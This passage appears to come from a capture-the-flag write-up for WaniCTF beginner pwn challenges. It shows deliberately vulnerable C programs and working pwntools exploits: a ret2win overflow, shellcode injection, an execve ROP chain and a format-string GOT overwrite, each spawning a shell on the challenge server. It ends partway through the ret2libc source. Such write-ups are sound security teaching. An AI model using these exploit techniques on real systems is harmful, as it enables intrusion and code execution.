class="keyword">define</span> BUF_SIZE 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_READ_LEN 48</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_stack</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n  #############################################\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  #                stack state                #\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  #############################################\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;                 hex           string\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_READ_LEN; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;       +--------------------+----------+\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; +0x%02x | 0x%016lx | &quot;</span>, i, *(<span class="type">unsigned</span> <span class="type">long</span> *)(buf + i));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">7</span>; j &gt; <span class="number">-1</span>; j--) &#123;</span><br><span class="line">      <span class="type">char</span> c = *(<span class="type">char</span> *)(buf + i + j);</span><br><span class="line">      <span class="keyword">if</span> (c &gt; <span class="number">0x7e</span> || c &lt; <span class="number">0x20</span>)</span><br><span class="line">        c = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">40</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot; | &lt;- TARGET!!!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot; |\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;       +--------------------+----------+\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span>(<span class="string">&quot;xor %rax, %rax\n&quot;</span></span><br><span class="line">      <span class="string">&quot;xor %rsi, %rsi\n&quot;</span></span><br><span class="line">      <span class="string">&quot;xor %rdx, %rdx\n&quot;</span></span><br><span class="line">      <span class="string">&quot;mov $0x3b, %al\n&quot;</span></span><br><span class="line">      <span class="string">&quot;mov $0x68732f6e69622f, %rdi\n&quot;</span></span><br><span class="line">      <span class="string">&quot;push %rdi\n&quot;</span></span><br><span class="line">      <span class="string">&quot;mov %rsp, %rdi\n&quot;</span></span><br><span class="line">      <span class="string">&quot;syscall&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ofs = <span class="number">0</span>, ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  init();</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s overwrite the target address with that of the win function!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (ofs &lt; MAX_READ_LEN) &#123;</span><br><span class="line">    show_stack(buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your input (max. %d bytes) &gt; &quot;</span>, MAX_READ_LEN - ofs);</span><br><span class="line">    ret = read(<span class="number">0</span>, buf + ofs, MAX_READ_LEN - ofs);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    ofs += ret;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>typical re2win challenge, buffer overflow in <code>read(0, buf + ofs, MAX_READ_LEN - ofs);</code><br>funtion</p>
<h4 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./chall&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;ret2win-pwn.wanictf.org&quot;</span>,<span class="number">9003</span>)</span><br><span class="line">payload=cyclic(<span class="number">40</span>)+p64(elf.sym.win)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure>

<h3 id="shellcode-basic"><a href="#shellcode-basic" class="headerlink" title="shellcode_basic"></a>shellcode_basic</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> code[<span class="number">1024</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter shellcode: &quot;</span>);</span><br><span class="line">  fgets(code, <span class="keyword">sizeof</span>(code), <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="type">void</span> (*shellcode)() = (<span class="type">void</span> (*)())code;</span><br><span class="line">  shellcode();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>typical ret2shellcode, we have given template just send the shellcode with padding </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#pc = process(&quot;./chall&quot;)</span></span><br><span class="line">pc = remote(<span class="string">&quot;shell-basic-pwn.wanictf.org&quot;</span>,<span class="number">9004</span>)</span><br><span class="line"><span class="comment"># pc = remote(&quot;&quot;,)</span></span><br><span class="line"><span class="comment">#shell_code = b&quot;&quot;  # PUT YOUR SHELL CODE HERE</span></span><br><span class="line">pc.sendline(asm(shellcraft.amd64.linux.sh(), arch=<span class="string">&#x27;amd64&#x27;</span>))</span><br><span class="line">pc.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="beginners-ROP"><a href="#beginners-ROP" class="headerlink" title="beginners ROP"></a>beginners ROP</h3><h4 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h4><blockquote>
<p>-&gt; In “ret2win,” the shell was obtained by overwriting the return address with the address of the win function.<br>-&gt; In this challenge, there is no win function available. In such cases, return-oriented programming (ROP) is an effective attack technique. You can launch a shell by continuously calling fragments of instructions that end with a “ret” called gadgets.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_READ_LEN 96</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_stack</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n  #############################################\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  #                stack state                #\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  #############################################\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;                 hex           string\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_READ_LEN; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;       +--------------------+----------+\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; +0x%02x | 0x%016lx | &quot;</span>, i, *(<span class="type">unsigned</span> <span class="type">long</span> *)(buf + i));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">7</span>; j &gt; <span class="number">-1</span>; j--) &#123;</span><br><span class="line">      <span class="type">char</span> c = *(<span class="type">char</span> *)(buf + i + j);</span><br><span class="line">      <span class="keyword">if</span> (c &gt; <span class="number">0x7e</span> || c &lt; <span class="number">0x20</span>)</span><br><span class="line">        c = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">40</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot; | &lt;- TARGET!!!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot; |\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;       +--------------------+----------+\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pop_rax_ret</span><span class="params">()</span> &#123; <span class="keyword">asm</span>(<span class="string">&quot;pop %rax; ret&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">xor_rsi_ret</span><span class="params">()</span> &#123; <span class="keyword">asm</span>(<span class="string">&quot;xor %rsi, %rsi; ret&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">xor_rdx_ret</span><span class="params">()</span> &#123; <span class="keyword">asm</span>(<span class="string">&quot;xor %rdx, %rdx; ret&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mov_rsp_rdi_pop_ret</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span>(<span class="string">&quot;mov %rsp, %rdi\n&quot;</span></span><br><span class="line">      <span class="string">&quot;add $0x8, %rsp\n&quot;</span></span><br><span class="line">      <span class="string">&quot;ret&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">syscall_ret</span><span class="params">()</span> &#123; <span class="keyword">asm</span>(<span class="string">&quot;syscall; ret&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ofs = <span class="number">0</span>, ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  init();</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s practice ROP attack!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (ofs &lt; MAX_READ_LEN) &#123;</span><br><span class="line">    show_stack(buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your input (max. %d bytes) &gt; &quot;</span>, MAX_READ_LEN - ofs);</span><br><span class="line">    ret = read(<span class="number">0</span>, buf + ofs, MAX_READ_LEN - ofs);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    ofs += ret;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>as hints says <strong>In this challenge, there is no win function available. In such cases, return-oriented programming (ROP) is an effective attack technique. You can launch a shell by continuously calling fragments of instructions that end with a “ret” called gadgets.</strong> </p>
<p>we have all gadgets given, use all these gadgets to make system call for <code>execve()</code>  function with <strong>&#x2F;bin&#x2F;sh</strong> arg that would be second arg for <code>execve</code> system call </p>
<h5 id="strategy"><a href="#strategy" class="headerlink" title="strategy"></a>strategy</h5><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pop</span> %rax; ret               <span class="comment"># load rax with next value on stack (system call number)</span></span><br><span class="line"><span class="keyword">xor</span> %rsi, %rsi; ret         <span class="comment"># clear rsi (second argument)</span></span><br><span class="line"><span class="keyword">xor</span> %rdx, %rdx; ret         <span class="comment"># clear rdx (third argument)</span></span><br><span class="line">mov %rsp, %rdi              <span class="comment"># load rdi with pointer to the command to execute (first argument)</span></span><br><span class="line">add $0x8, %rsp              <span class="comment"># skip the old rax value and align the stack</span></span><br><span class="line">ret                         <span class="comment"># return to the next instruction</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">syscall</span>; ret                <span class="comment"># trigger the system call</span></span><br></pre></td></tr></table></figure>

<p>where </p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax = <span class="number">0</span>x3b  # system call number for execve</span><br><span class="line">rdi = pointer <span class="selector-tag">to</span> &quot;/bin/sh&quot;  # command <span class="selector-tag">to</span> execute</span><br><span class="line">rsi = pointer <span class="selector-tag">to</span> NULL  # arguments for the command</span><br><span class="line">rdx = pointer <span class="selector-tag">to</span> NULL  # environment variables</span><br></pre></td></tr></table></figure>

<h4 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;chall_patched&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>) </span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span> </span><br><span class="line">offset = <span class="number">40</span> </span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27; continue &#x27;&#x27;&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># Allows you to switch between local/GDB/remote from terminal</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r = conn()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># create ROP object and set gadgets</span></span><br><span class="line">    rop = ROP(exe)</span><br><span class="line">    </span><br><span class="line">    pop_rax = <span class="number">0x0000000000401371</span></span><br><span class="line">    xor_rsi_rsi = <span class="number">0x000000000040137e</span></span><br><span class="line">    xor_rdx_rdx = <span class="number">0x000000000040138d</span> </span><br><span class="line">    mov_rsp_rdi = <span class="number">0x000000000040139c</span></span><br><span class="line">    syscall = <span class="number">0x00000000004013af</span></span><br><span class="line"></span><br><span class="line">    bin_sh = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># build ROP chain to open shell</span></span><br><span class="line">    chain = p64(pop_rax) + p64(<span class="number">0x3b</span>)  <span class="comment"># RAX = 0x3b for execve()</span></span><br><span class="line">    chain += p64(xor_rsi_rsi)  <span class="comment"># RSI = 0</span></span><br><span class="line">    chain += p64(xor_rdx_rdx)  <span class="comment"># RDX = 0</span></span><br><span class="line">    chain += p64(mov_rsp_rdi) </span><br><span class="line">    chain += bin_sh </span><br><span class="line">    chain += p64(syscall)  <span class="comment"># call syscall</span></span><br><span class="line"></span><br><span class="line">    payload = cyclic(<span class="number">40</span>) + chain</span><br><span class="line"></span><br><span class="line">    r.sendline(payload) </span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>


<h3 id="canaleak"><a href="#canaleak" class="headerlink" title="canaleak"></a>canaleak</h3><h4 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h4><blockquote>
<p>Canary is a random value assigned in memory to protect the stack. When this value changes, the program terminates abnormally.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// alarm(600);</span></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> nope[<span class="number">20</span>];</span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">strcmp</span>(nope, <span class="string">&quot;YES&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can&#x27;t overwrite return address if canary is enabled.\nDo you &quot;</span></span><br><span class="line">           <span class="string">&quot;agree with me? : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, nope);</span><br><span class="line">    <span class="built_in">printf</span>(nope);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>again typical format string vuln with partial relro </p>
<p><img src="/imgs/post4/pwn/canaleak_checksec.png" alt="checksec"></p>
<p>i overwrote the <code>printf@got</code> with <code>win</code>  function </p>
<h4 id="Exploit-4"><a href="#Exploit-4" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process()</span></span><br><span class="line">p = remote(<span class="string">&quot;canaleak-pwn.wanictf.org&quot;</span>,<span class="number">9006</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">got_ow</span>():</span><br><span class="line">    payload = &#123;</span><br><span class="line">                elf.got.printf: elf.sym.win</span><br><span class="line">            &#125;</span><br><span class="line">    payload = fmtstr_payload(<span class="number">6</span>,payload,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload </span><br><span class="line"></span><br><span class="line">payload = got_ow() </span><br><span class="line">p.recvuntil(<span class="string">&quot;me? : &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>


<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><h4 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h4><blockquote>
<p>-&gt; To use gadgets in libc, you need to determine the location of libc in memory.<br>-&gt; The return address from the main function already contains an address from libc. Although this address changes each time the program is executed, the relative address of libc is constant.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_READ_LEN 128</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_stack</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">  <span 